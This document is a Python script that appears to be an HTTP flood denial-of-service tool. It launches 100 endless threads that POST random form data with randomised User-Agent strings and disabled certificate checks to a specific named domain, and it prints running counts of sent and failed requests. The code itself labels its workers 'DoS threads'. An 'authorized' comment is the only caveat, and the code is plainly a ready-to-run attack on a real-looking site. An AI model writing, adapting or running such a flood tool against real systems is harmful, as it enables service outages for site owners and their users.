import threading
import requests
import random
import string
import time

# ✅ Set your HTTPS target here
target_url = "http://brandboosting.shop"  # MUST be HTTPS and authorized
num_threads = 100

# Global counters
success_count = 0
fail_count = 0
counter_lock = threading.Lock()

def random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def flood():
    global success_count, fail_count
    while True:
        try:
            payload = {random_string(): random_string() for _ in range(5)}
            headers = {
                "User-Agent": random_string(12),
                "Content-Type": "application/x-www-form-urlencoded"
            }

            # 👇 verify=False skips SSL cert validation (optional)
            response = requests.post(target_url, data=payload, headers=headers, timeout=5, verify=False)

            with counter_lock:
                if response.status_code == 200:
                    success_count += 1
                else:
                    fail_count += 1

        except requests.exceptions.RequestException:
            with counter_lock:
                fail_count += 1

def print_stats():
    global success_count, fail_count
    while True:
        with counter_lock:
            print(f"[HTTPS] [+] Sent: {success_count} | [-] Failed: {fail_count}", end="\r")
        time.sleep(1)

# Start stats monitor thread
stat_thread = threading.Thread(target=print_stats)
stat_thread.daemon = True
stat_thread.start()

# Start DoS threads
for _ in range(num_threads):
    thread = threading.Thread(target=flood)
    thread.daemon = True
    thread.start()

# Keep main thread alive
while True:
    pass
